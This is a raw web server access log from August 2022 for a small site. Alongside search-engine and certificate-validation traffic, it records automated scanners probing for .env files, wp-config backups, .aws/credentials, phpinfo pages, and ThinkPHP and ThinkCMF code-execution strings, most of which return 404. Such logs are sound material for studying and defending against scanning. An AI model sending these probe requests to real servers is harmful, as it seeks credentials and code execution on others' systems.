::ffff:109.70.100.20 - - [01/Aug/2022:00:03:37 +0000] "GET / HTTP/1.1" 200 58071 "http://wadokikai.org" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
::ffff:185.254.196.115 - - [01/Aug/2022:00:04:34 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:185.254.196.115 - - [01/Aug/2022:00:04:35 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:103.252.225.165 - - [01/Aug/2022:00:14:21 +0000] "GET / HTTP/1.1" 200 58071 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.2130.33 Safari/537.36"
::ffff:103.252.225.165 - - [01/Aug/2022:00:14:22 +0000] "GET /BLOG/ HTTP/1.1" 404 144 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.2130.33 Safari/537.36"
::ffff:3.145.17.220 - - [01/Aug/2022:00:18:42 +0000] "GET /.well-known/acme-challenge/PDukv7A6POqvAd5YJgcXkIL9GMYO2FCvlVe3GYXdqBw HTTP/1.1" 404 209 "-" "Mozilla/5.0 (compatible; Let's Encrypt validation server; +https://www.letsencrypt.org)"
::ffff:54.69.7.18 - - [01/Aug/2022:00:18:42 +0000] "GET /.well-known/acme-challenge/PDukv7A6POqvAd5YJgcXkIL9GMYO2FCvlVe3GYXdqBw HTTP/1.1" 404 209 "-" "Mozilla/5.0 (compatible; Let's Encrypt validation server; +https://www.letsencrypt.org)"
::ffff:23.178.112.208 - - [01/Aug/2022:00:18:43 +0000] "GET /.well-known/acme-challenge/PDukv7A6POqvAd5YJgcXkIL9GMYO2FCvlVe3GYXdqBw HTTP/1.1" 404 209 "-" "Mozilla/5.0 (compatible; Let's Encrypt validation server; +https://www.letsencrypt.org)"
::ffff:185.7.214.104 - - [01/Aug/2022:00:28:46 +0000] "GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP21 HTTP/1.1" 404 148 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
::ffff:205.210.31.26 - - [01/Aug/2022:00:54:08 +0000] "GET / HTTP/1.0" 200 58071 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
::ffff:66.249.75.215 - - [01/Aug/2022:01:00:51 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:66.249.75.217 - - [01/Aug/2022:01:00:51 +0000] "GET / HTTP/1.1" 200 58071 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:66.249.75.219 - - [01/Aug/2022:01:00:51 +0000] "GET /terminology.html HTTP/1.1" 404 155 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:13.57.252.74 - - [01/Aug/2022:01:00:51 +0000] "OPTIONS / HTTP/1.1" 200 8 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36"
::ffff:66.249.75.217 - - [01/Aug/2022:01:01:15 +0000] "GET /instructors.php HTTP/1.1" 404 154 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:135.125.246.110 - - [01/Aug/2022:01:15:10 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:135.125.246.110 - - [01/Aug/2022:01:15:11 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:130.211.54.158 - - [01/Aug/2022:01:22:14 +0000] "GET / HTTP/1.1" 200 58071 "-" "python-requests/2.28.1"
::ffff:185.7.214.104 - - [01/Aug/2022:01:26:57 +0000] "GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> HTTP/1.1" 200 58071 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
::ffff:66.249.75.215 - - [01/Aug/2022:01:32:42 +0000] "GET /events.html HTTP/1.1" 404 150 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:185.254.196.115 - - [01/Aug/2022:01:32:48 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:185.254.196.115 - - [01/Aug/2022:01:32:48 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:81.82.83.141 - - [01/Aug/2022:01:43:02 +0000] "GET / HTTP/1.1" 200 58071 "-" "-"
::ffff:66.249.75.215 - - [01/Aug/2022:01:46:15 +0000] "GET /instructors.php HTTP/1.1" 404 154 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:3.84.210.247 - - [01/Aug/2022:01:52:18 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:3.84.210.247 - - [01/Aug/2022:01:52:18 +0000] "GET / HTTP/1.1" 200 58071 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:3.84.210.247 - - [01/Aug/2022:01:52:19 +0000] "GET /xmlrpc.php?rsd HTTP/1.1" 404 149 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:3.84.210.247 - - [01/Aug/2022:01:52:19 +0000] "GET /phpmyadmin/ HTTP/1.1" 404 150 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:3.84.210.247 - - [01/Aug/2022:01:52:20 +0000] "GET / HTTP/1.1" 200 58071 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:3.84.210.247 - - [01/Aug/2022:01:52:21 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:3.120.228.165 - - [01/Aug/2022:02:07:34 +0000] "GET / HTTP/1.1" 200 58071 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246"
::ffff:3.120.228.165 - - [01/Aug/2022:02:07:34 +0000] "GET /_profiler/phpinfo HTTP/1.1" 404 156 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246"
::ffff:3.120.228.165 - - [01/Aug/2022:02:07:34 +0000] "GET /phpinfo.php HTTP/1.1" 404 150 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246"
::ffff:3.120.228.165 - - [01/Aug/2022:02:07:35 +0000] "GET /phpinfo HTTP/1.1" 404 146 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246"
::ffff:3.120.228.165 - - [01/Aug/2022:02:07:35 +0000] "GET /info.php HTTP/1.1" 404 147 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246"
::ffff:3.120.228.165 - - [01/Aug/2022:02:07:35 +0000] "GET /php.ini HTTP/1.1" 404 146 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246"
::ffff:3.120.228.165 - - [01/Aug/2022:02:07:35 +0000] "GET /php.php HTTP/1.1" 404 146 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246"
::ffff:3.120.228.165 - - [01/Aug/2022:02:07:35 +0000] "GET /infophp.php HTTP/1.1" 404 150 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246"
::ffff:3.120.228.165 - - [01/Aug/2022:02:07:35 +0000] "GET /test.php HTTP/1.1" 404 147 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246"
::ffff:3.120.228.165 - - [01/Aug/2022:02:07:35 +0000] "GET /dashboard/phpinfo.php HTTP/1.1" 404 160 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246"
::ffff:3.120.228.165 - - [01/Aug/2022:02:07:36 +0000] "GET /php-info.php HTTP/1.1" 404 151 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246"
::ffff:3.120.228.165 - - [01/Aug/2022:02:07:36 +0000] "GET /linusadmin-phpinfo.php HTTP/1.1" 404 161 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246"
::ffff:3.120.228.165 - - [01/Aug/2022:02:07:36 +0000] "GET /infos.php HTTP/1.1" 404 148 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246"
::ffff:3.120.228.165 - - [01/Aug/2022:02:07:36 +0000] "GET /old_phpinfo.php HTTP/1.1" 404 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246"
::ffff:3.120.228.165 - - [01/Aug/2022:02:07:36 +0000] "GET /temp.php HTTP/1.1" 404 147 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246"
::ffff:3.120.228.165 - - [01/Aug/2022:02:07:36 +0000] "GET /time.php HTTP/1.1" 404 147 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246"
::ffff:3.120.228.165 - - [01/Aug/2022:02:07:36 +0000] "GET /phpversion.php HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246"
::ffff:3.120.228.165 - - [01/Aug/2022:02:07:37 +0000] "GET /pinfo.php HTTP/1.1" 404 148 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246"
::ffff:3.120.228.165 - - [01/Aug/2022:02:07:37 +0000] "GET /i.php HTTP/1.1" 404 144 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246"
::ffff:3.120.228.165 - - [01/Aug/2022:02:07:37 +0000] "GET /asdf.php HTTP/1.1" 404 147 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246"
::ffff:3.120.228.165 - - [01/Aug/2022:02:07:37 +0000] "GET /config.json HTTP/1.1" 404 150 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246"
::ffff:3.120.228.165 - - [01/Aug/2022:02:07:37 +0000] "GET /config/config.json HTTP/1.1" 404 157 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246"
::ffff:3.120.228.165 - - [01/Aug/2022:02:07:37 +0000] "GET /info.json HTTP/1.1" 404 148 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246"
::ffff:3.120.228.165 - - [01/Aug/2022:02:07:37 +0000] "GET /.config/gatsby/config.json HTTP/1.1" 404 165 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246"
::ffff:3.120.228.165 - - [01/Aug/2022:02:07:38 +0000] "GET /.cordova/config.json HTTP/1.1" 404 159 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246"
::ffff:3.120.228.165 - - [01/Aug/2022:02:07:38 +0000] "GET /.deployment-config.json HTTP/1.1" 404 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246"
::ffff:3.120.228.165 - - [01/Aug/2022:02:07:38 +0000] "GET /.docker/config.json HTTP/1.1" 404 158 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246"
::ffff:3.120.228.165 - - [01/Aug/2022:02:07:38 +0000] "GET /.docker/daemon.json HTTP/1.1" 404 158 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246"
::ffff:3.120.228.165 - - [01/Aug/2022:02:07:38 +0000] "GET /.jupyter/jupyter_notebook_config.json HTTP/1.1" 404 176 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246"
::ffff:3.120.228.165 - - [01/Aug/2022:02:07:38 +0000] "GET /.lanproxy/config.json HTTP/1.1" 404 160 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246"
::ffff:3.120.228.165 - - [01/Aug/2022:02:07:38 +0000] "GET /_wpeprivate/config.json HTTP/1.1" 404 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246"
::ffff:3.120.228.165 - - [01/Aug/2022:02:07:39 +0000] "GET /console/base/config.json HTTP/1.1" 404 163 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246"
::ffff:3.120.228.165 - - [01/Aug/2022:02:07:39 +0000] "GET /console/payments/config.json HTTP/1.1" 404 167 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246"
::ffff:3.120.228.165 - - [01/Aug/2022:02:07:39 +0000] "GET /server/config.json HTTP/1.1" 404 157 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246"
::ffff:3.120.228.165 - - [01/Aug/2022:02:07:39 +0000] "GET /.env.bak HTTP/1.1" 404 147 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246"
::ffff:3.120.228.165 - - [01/Aug/2022:02:07:39 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246"
::ffff:3.120.228.165 - - [01/Aug/2022:02:07:39 +0000] "GET /config.env HTTP/1.1" 404 149 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246"
::ffff:3.120.228.165 - - [01/Aug/2022:02:07:39 +0000] "GET /.env.dist HTTP/1.1" 404 148 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246"
::ffff:3.120.228.165 - - [01/Aug/2022:02:07:40 +0000] "GET /.env.dev HTTP/1.1" 404 147 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246"
::ffff:3.120.228.165 - - [01/Aug/2022:02:07:40 +0000] "GET /.env.local HTTP/1.1" 404 149 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246"
::ffff:3.120.228.165 - - [01/Aug/2022:02:07:40 +0000] "GET /public/.env HTTP/1.1" 404 150 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246"
::ffff:3.120.228.165 - - [01/Aug/2022:02:07:40 +0000] "GET /laravel/.env HTTP/1.1" 404 151 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246"
::ffff:3.120.228.165 - - [01/Aug/2022:02:07:40 +0000] "GET /laravel/core/.env HTTP/1.1" 404 156 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246"
::ffff:3.120.228.165 - - [01/Aug/2022:02:07:40 +0000] "GET /beta/.env HTTP/1.1" 404 148 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246"
::ffff:3.120.228.165 - - [01/Aug/2022:02:07:40 +0000] "GET /kyc/.env HTTP/1.1" 404 147 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246"
::ffff:3.120.228.165 - - [01/Aug/2022:02:07:41 +0000] "GET /admin/.env HTTP/1.1" 404 149 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246"
::ffff:3.120.228.165 - - [01/Aug/2022:02:07:41 +0000] "GET /prod/.env HTTP/1.1" 404 148 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246"
::ffff:3.120.228.165 - - [01/Aug/2022:02:07:41 +0000] "GET /.env.backup HTTP/1.1" 404 150 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246"
::ffff:3.120.228.165 - - [01/Aug/2022:02:07:41 +0000] "GET /.env.docker.dev HTTP/1.1" 404 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246"
::ffff:3.120.228.165 - - [01/Aug/2022:02:07:41 +0000] "GET /.env.php HTTP/1.1" 404 147 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246"
::ffff:3.120.228.165 - - [01/Aug/2022:02:07:41 +0000] "GET /.env.prod HTTP/1.1" 404 148 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246"
::ffff:3.120.228.165 - - [01/Aug/2022:02:07:41 +0000] "GET /.env.production.local HTTP/1.1" 404 160 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246"
::ffff:3.120.228.165 - - [01/Aug/2022:02:07:42 +0000] "GET /.env.sample.php HTTP/1.1" 404 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246"
::ffff:3.120.228.165 - - [01/Aug/2022:02:07:42 +0000] "GET /.env.save HTTP/1.1" 404 148 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246"
::ffff:3.120.228.165 - - [01/Aug/2022:02:07:42 +0000] "GET /.env.stage HTTP/1.1" 404 149 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246"
::ffff:3.120.228.165 - - [01/Aug/2022:02:07:42 +0000] "GET /.env.test HTTP/1.1" 404 148 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246"
::ffff:3.120.228.165 - - [01/Aug/2022:02:07:42 +0000] "GET /.env.test.localapi/.env HTTP/1.1" 404 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246"
::ffff:3.120.228.165 - - [01/Aug/2022:02:07:42 +0000] "GET /.docker/.env HTTP/1.1" 404 151 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246"
::ffff:3.120.228.165 - - [01/Aug/2022:02:07:42 +0000] "GET /.docker/laravel/app/.env HTTP/1.1" 404 163 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246"
::ffff:3.120.228.165 - - [01/Aug/2022:02:07:43 +0000] "GET /env.backup HTTP/1.1" 404 149 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246"
::ffff:3.120.228.165 - - [01/Aug/2022:02:07:43 +0000] "GET /.environment HTTP/1.1" 404 151 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246"
::ffff:3.120.228.165 - - [01/Aug/2022:02:07:43 +0000] "GET /.envrc HTTP/1.1" 404 145 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246"
::ffff:3.120.228.165 - - [01/Aug/2022:02:07:43 +0000] "GET /.envs HTTP/1.1" 404 144 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246"
::ffff:3.120.228.165 - - [01/Aug/2022:02:07:43 +0000] "GET /.env~ HTTP/1.1" 404 144 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246"
::ffff:3.120.228.165 - - [01/Aug/2022:02:07:43 +0000] "GET /.gitlab-ci/.env HTTP/1.1" 404 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246"
::ffff:3.120.228.165 - - [01/Aug/2022:02:07:43 +0000] "GET /.vscode/.env HTTP/1.1" 404 151 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246"
::ffff:3.120.228.165 - - [01/Aug/2022:02:07:44 +0000] "GET /mailer/.env HTTP/1.1" 404 150 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246"
::ffff:3.120.228.165 - - [01/Aug/2022:02:07:44 +0000] "GET /twitter/.env HTTP/1.1" 404 151 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246"
::ffff:3.120.228.165 - - [01/Aug/2022:02:07:44 +0000] "GET /.env.development.local HTTP/1.1" 404 161 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246"
::ffff:3.120.228.165 - - [01/Aug/2022:02:07:44 +0000] "GET /wp-config.php.bak HTTP/1.1" 404 156 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246"
::ffff:3.120.228.165 - - [01/Aug/2022:02:07:44 +0000] "GET /wp-config.php.old HTTP/1.1" 404 156 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246"
::ffff:3.120.228.165 - - [01/Aug/2022:02:07:44 +0000] "GET /wp-config.php-backup HTTP/1.1" 404 159 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246"
::ffff:3.120.228.165 - - [01/Aug/2022:02:07:44 +0000] "GET /.aws/credentials HTTP/1.1" 404 155 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246"
::ffff:3.120.228.165 - - [01/Aug/2022:02:07:45 +0000] "GET /.s3cfg HTTP/1.1" 404 145 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246"
